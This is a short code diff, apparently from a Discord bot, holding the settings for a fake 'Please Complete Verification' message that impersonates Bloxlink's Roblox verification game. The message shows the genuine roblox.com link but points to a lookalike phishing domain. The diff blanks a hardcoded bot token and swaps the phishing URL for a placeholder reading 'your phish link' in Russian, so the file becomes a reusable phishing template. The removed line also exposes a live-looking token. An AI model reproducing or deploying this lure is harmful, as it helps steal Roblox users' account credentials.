@@ -4,13 +4,13 @@ import requests
 
 
 
-token = "OTk3NTMwNzE1NjIzMjYwMzQw.G5M5Ff.Pm7ppB00pkCClrGyRvTs0jfrEc7AfjJZp7GFWs"
+token = ""
 prefix = "?"
 title = "Please Complete Verification"
 desc ="To verify your account, please join BloxLink's Official Roblox Verification Game"
 field = "Please Login and join the game"
 hyperlink = "https://www.roblox.com/games/1271943503/Bloxlink-Verification-Game"
-phish = "https://roblox.uk.com/games/1271943503/Bloxlink-Verification-Game"
+phish = "Ваша фишинг сыллка - your phish link"
 
 
 
